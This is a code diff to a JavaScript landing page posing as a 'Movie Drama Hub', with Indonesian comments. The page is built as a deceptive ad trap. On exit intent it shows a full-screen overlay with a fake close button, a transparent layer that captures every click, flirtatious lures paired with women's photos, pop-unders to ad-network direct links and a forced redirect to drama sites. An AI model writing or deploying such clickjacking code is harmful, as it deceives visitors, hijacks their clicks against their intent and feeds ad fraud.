@@ -2,13 +2,14 @@
     'use strict';
 
     // ==========================================
-    // PUSAT KONTROL UTAMA (V.12 - THE INVISIBLE GLASS TRAP)
+    // PUSAT KONTROL UTAMA (V.FINAL - THE HONEY TRAP)
     // ==========================================
     const config = {
-        id: "ads_ghost_v12",
+        id: "ads_ghost_v_final_honey",
         pageTitle: "Movie Drama Hub",
         pageTagline: "Your #1 Source for Asian Dramas, Movies & Anime",
         
+        // 10 Rotasi Foto Profil
         profileImages: [
             "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYSgOyWaIakV8zVKF7pFo5NnRUWvGLxOauPAoezNWBNAw3L_wZDteJGSYRjCf8HR49hOdgkHi1a6yfIGhs804JFctskrwj6vYL6S26uria83j5BAIgBmZMXm6P-wTLiHOeJyO8dCd1gSZivh18T4wk1lZ70uXZZZwCAKhXops7EvzsDwa-12qZKzzgdopq/s709/meeigth.png",
             "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCcdl4EUPTunIcYmsahzlcbcFe6M7rCI6CLtHxZgdkQzbARNdn6kZTM3tEKM7l5EtBlneaa52pdzSkdkZ5cIkX3wSC2m2l2LExfaGpg5kedj4TL9sfG6RoTFguXI5_n4Kucr-dKyfc402maxlKnZLw3kCEzpgeDj34HsGdJ_KbhndMJakcTGMF3F04Tlhs/s850/mefive.png",
@@ -21,6 +22,20 @@
             "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWgxPBTHI5JUWKuu0VDXs_KQM0PKu6j9b-YqjgKZq1SBqc-F2JBlATfcvLLJXVcCGEV6hSxfux3aGA8qVl5s8oegZjzuvU8Gq0vGdf8qh5t3tWCCNZrEaoBzhrRWJfLbRWZ9CiiaTfBcYwSfqryuw2ldv8sqCQyEn1RAYIJL7qhQNR05lIix79j44droHN/s1077/metree.png",
             "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgye95RZkuV_Wcq06zZFF6WauCla0SRjCha2GDDwD5_FhuEV_aD4KKVHBpnt1DU-RhJtSgGjo9rWzdaQ7vQfUnKcEkNd9VS1plQTUE8GxmhQ3YyE9ScgJMjndOLEwunXY_NxSpxsiMi-WkQU5REcuPLRXXtSyYNbOZ36s2UNkBkGm3bwH5TzKypyw5hJbmf/s624/metwo.png"
         ], 
+
+        // 10 Rayuan Maut untuk Exit-Intent (Sesuai Urutan Gambar)
+        catchyPhrases: [
+            "Wait, don't leave me yet! 🥺",
+            "Are you really leaving so soon, honey?",
+            "Stay a little longer... I have something for you.",
+            "Don't go! The best part is just starting! 😘",
+            "Leaving already? But we just met! 💔",
+            "Please stay! I was waiting for you...",
+            "Wait! Don't close this tab yet, darling.",
+            "Hold on! Are you sure you want to go?",
+            "Don't say goodbye just yet... 🥺",
+            "Stay here with me! The movie is about to start."
+        ],
         
         directLinks: [
             "https://www.effectivegatecpm.com/s15nzb96e?key=9cc6829d33a9e899d03bb9a04d01a9b0",
@@ -31,7 +46,7 @@
             "https://www.effectivegatecpm.com/t87gfc3yhi?key=2164efa91dc1c5bda338aef55de7e272",
             "https://www.profitablecpmratenetwork.com/dcy7c3jpv?key=69b42ceba8a121536e80e232dcaaaf61"
         ],
-        frequency: 120, // 120 Menit = 2 Jam Cooldown
+        frequency: 120, // Cooldown 120 menit (2 Jam)
         targetWebsites: ["https://chinadrama.xyz", "https://cinemagz.net", "https://chinadrama.online"],
         targetPath: "/en/latest"
     };
@@ -39,8 +54,13 @@
     const storageKey = 'act_log_' + config.id;
     const selectedWeb = config.targetWebsites[Math.floor(Math.random() * config.targetWebsites.length)];
     const finalDestinationURL = selectedWeb + config.targetPath;
-    const selectedImage = config.profileImages[Math.floor(Math.random() * config.profileImages.length)];
-    let exitIntentTriggered = false; // Kunci agar Vignette cuma muncul sekali
+    
+    // THE DICE: Mengambil 1 angka acak dari 0 sampai 9 untuk mengunci Foto dan Teks yang sama!
+    const randomIndex = Math.floor(Math.random() * config.profileImages.length);
+    const selectedImage = config.profileImages[randomIndex];
+    const selectedPhrase = config.catchyPhrases[randomIndex];
+    
+    let exitIntentTriggered = false; 
 
     const utils = {
         setStorage: (n, v, m) => { localStorage.setItem(n, JSON.stringify({ value: v, expiry: new Date().getTime() + (m * 60 * 1000) })); },
@@ -65,7 +85,6 @@
         // FITUR VIGNETTE & THE INVISIBLE GLASS TRAP
         // ==========================================
         initExitIntent: function() {
-            // Radar Desktop: Kursor lari ke atas
             document.addEventListener('mouseout', function(e) {
                 if (e.clientY < 10 && !exitIntentTriggered && !utils.getStorage(storageKey)) {
                     exitIntentTriggered = true;
@@ -73,7 +92,6 @@
                 }
             });
             
-            // Radar Mobile: Scroll ke atas dengan cepat
             let lastScrollTop = 0;
             window.addEventListener('scroll', function() {
                 let st = window.pageYOffset || document.documentElement.scrollTop;
@@ -86,67 +104,60 @@
         },
         
         showVignetteTrap: function() {
-            // 1. Matikan Floating Banner agar tidak mengganggu
             const floatingAd = document.getElementById('promo-zone-wrapper');
             if (floatingAd) floatingAd.style.display = 'none';
 
-            // 2. Buat Layar Gelap (Base Shield)
             const shield = document.createElement('div');
             shield.id = "vignette-overlay";
-            // KURSOR POINTER AKTIF DI SELURUH LAYAR GELAP
-            shield.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0, 0, 0, 0.85); backdrop-filter:blur(8px); z-index:99999999; display:flex; justify-content:center; align-items:center; opacity:0; transition:opacity 0.3s ease; cursor:pointer;";
+            shield.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0, 0, 0, 0.85); backdrop-filter:blur(8px); z-index:99999999; display:flex; flex-direction:column; justify-content:center; align-items:center; opacity:0; transition:opacity 0.3s ease; cursor:pointer;";
             
-            // 3. Buat Kotak Iklan Putih di Tengah
+            // Text Rayuan Dinamis ditambahkan di atas Kotak Iklan
+            const textTrap = document.createElement('h2');
+            textTrap.innerHTML = selectedPhrase; // <--- SUNTIKAN KATA-KATA RAYUAN DI SINI
+            textTrap.style = "color:#ffffff; font-family:'Inter', sans-serif; font-size:1.5rem; text-align:center; margin-bottom:20px; padding: 0 15px; text-shadow: 0 2px 5px rgba(0,0,0,0.5); z-index:10; pointer-events:none;";
+            
             const box = document.createElement('div');
-            box.style = "position:relative; width:300px; height:250px; background:#fff; border-radius:10px; box-shadow:0 15px 35px rgba(0,0,0,0.8); pointer-events:none;"; // Pointer events dimatikan agar klik menembus ke jebakan
+            box.style = "position:relative; width:300px; height:250px; background:#fff; border-radius:10px; box-shadow:0 15px 35px rgba(0,0,0,0.8); pointer-events:none;"; 
 
-            // 4. Ornamen: Foto Cewek Berkedip (Kiri Atas)
             const profPic = document.createElement('img');
-            profPic.src = selectedImage;
+            profPic.src = selectedImage; // <--- FOTO YANG COCOK DENGAN RAYUAN
             profPic.style = "position:absolute; top:-35px; left:-35px; width:80px; height:80px; border-radius:50%; border:3px solid #fff; box-shadow:0 5px 15px rgba(0,0,0,0.5); animation:pulseVignette 1.5s infinite; z-index:10;";
 
-            // 5. Ornamen: Tombol Close Palsu (Kanan Atas)
             const closeBtn = document.createElement('div');
             closeBtn.innerHTML = "&#10006;";
             closeBtn.style = "position:absolute; top:-15px; right:-15px; width:35px; height:35px; background:#ef4444; color:#fff; border-radius:50%; display:flex; justify-content:center; align-items:center; font-weight:bold; font-family:sans-serif; box-shadow:0 4px 10px rgba(0,0,0,0.5); z-index:10;";
 
-            // 6. Tempat Iklan Adsterra
             const adContainer = document.createElement('div');
             adContainer.style = "width:100%; height:100%; overflow:hidden; border-radius:10px; pointer-events:auto;";
 
-            // 7. SUNTIKAN SCRIPT IKLAN ADSTERRA (250x300)
             window.atOptions = { 'key': 'cbbbef1dd648a19b2dea3e278ec2775f', 'format': 'iframe', 'height': 250, 'width': 300, 'params': {} };
             const adScript = document.createElement('script'); 
             adScript.src = 'https://www.highperformanceformat.com/cbbbef1dd648a19b2dea3e278ec2775f/invoke.js';
             adContainer.appendChild(adScript);
 
-            // Susun Elemen
             box.appendChild(profPic);
             box.appendChild(closeBtn);
             box.appendChild(adContainer);
             
-            // 8. THE GLASS TRAP! (DIV Transparan menutupi Kotak Iklan)
             const glassTrap = document.createElement('div');
             glassTrap.style = "position:absolute; top:0; left:0; width:100%; height:100%; z-index:9999; cursor:pointer;";
             box.appendChild(glassTrap);
 
+            shield.appendChild(textTrap); // Masukkan teks ke dalam shield
             shield.appendChild(box);
             document.body.appendChild(shield);
 
-            // Injeksi Animasi CSS untuk Foto Berkedip
             const style = document.createElement('style');
             style.innerHTML = "@keyframes pulseVignette { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(255,255,255,0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); } }";
             document.head.appendChild(style);
 
-            // Animasi Fade-In
             setTimeout(() => { shield.style.opacity = "1"; }, 50);
 
-            // 9. LOGIKA LEDAKAN BRUTAL (Klik Area Gelap ATAU Area Kotak)
+            // LOGIKA LEDAKAN BRUTAL (Klik di mana saja)
             shield.addEventListener('click', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
                 
-                // Jika cooldown 2 jam belum aktif, ledakkan Pop-Under
                 if (!utils.getStorage(storageKey)) {
                     const randomUrl = config.directLinks[Math.floor(Math.random() * config.directLinks.length)];
                     const win = window.open(randomUrl, '_blank');
@@ -154,8 +165,7 @@
                     utils.setStorage(storageKey, 'true', config.frequency);
                 }
                 
-                // Apapun yang terjadi (meledak atau cooldown), paksa redirect ke Web Drama China
-                shield.innerHTML = "<h2 style='color:#fff; font-family:sans-serif;'>Redirecting to Movies...</h2>";
+                shield.innerHTML = "<h2 style='color:#fff; font-family:sans-serif;'>Redirecting...</h2>";
                 setTimeout(() => { window.location.href = finalDestinationURL; }, 400);
             });
         }
@@ -191,9 +201,6 @@
                     </a>
                     <a class="social-btn safe-trigger-btn" href="https://www.instagram.com/nisrinamanaf" aria-label="Instagram">
                         <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
-                    </a>
-                    <a class="social-btn safe-trigger-btn" href="https://youtube.com/" aria-label="YouTube">
-                        <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
                     </a>
                 </div>
                 <footer><p>&#169; 2026 ${config.pageTitle}. All rights reserved.</p></footer>
